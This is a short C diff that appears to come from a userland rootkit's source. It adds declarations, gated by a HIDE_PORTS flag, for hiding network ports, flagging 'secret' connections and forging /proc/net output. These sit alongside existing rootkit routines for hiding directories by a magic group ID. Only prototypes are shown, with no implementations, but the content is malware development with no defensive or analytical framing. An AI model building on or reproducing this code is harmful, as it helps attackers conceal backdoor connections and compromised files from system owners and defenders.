@@ -170,6 +170,13 @@ int logcount(const char *path);
 int rknomore(void);
 #include "nomore.c"
 
+#ifdef HIDE_PORTS
+int is_hidden_port(int port);
+int secret_connection(char line[]);
+int hideport_alive(void);
+FILE *forge_procnet(const char *pathname);
+#endif
+
 void eradicatedir(const char *target);
 void hidedircontents(const char *target, gid_t magicgid);
 #include "magic/magic.h"
